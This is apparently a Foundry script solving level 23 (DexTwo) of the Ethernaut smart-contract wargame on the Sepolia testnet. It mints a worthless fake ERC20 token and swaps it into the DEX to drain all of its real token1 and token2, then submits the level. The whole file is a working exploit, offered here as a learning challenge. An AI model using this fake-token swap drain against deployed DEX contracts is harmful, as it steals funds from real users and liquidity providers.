// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Level23.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract FakeToken is ERC20 {
    constructor(address _caller) ERC20("fakeToken", "fkt") {
        _mint(_caller, type(uint256).max);
    }
}

contract Level23 is Script {
    IEthernaut _ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address _caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        DexTwo _instance = DexTwo(payable(vm.envAddress("LVL23_ADDR")));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        FakeToken fakeTok = new FakeToken(_caller);

        fakeTok.transfer(address(_instance), 100);
        fakeTok.approve(address(_instance), type(uint256).max);

        _instance.swap(address(fakeTok), _instance.token1(), 100);
        _instance.swap(address(fakeTok), _instance.token2(), 200);

        uint256 balance1 = SwappableTokenTwo(_instance.token1()).balanceOf(address(_instance));
        uint256 balance2 = SwappableTokenTwo(_instance.token2()).balanceOf(address(_instance));

        if (balance1 == 0 && balance2 == 0) {
            _ethernaut.submitLevelInstance(address(_instance));
        } else {
            console2.log("Contract not drained");
        }
    }
}

// forge script script/Level23.s.sol --tc Level23 --broadcast --rpc-url sepolia -vvv
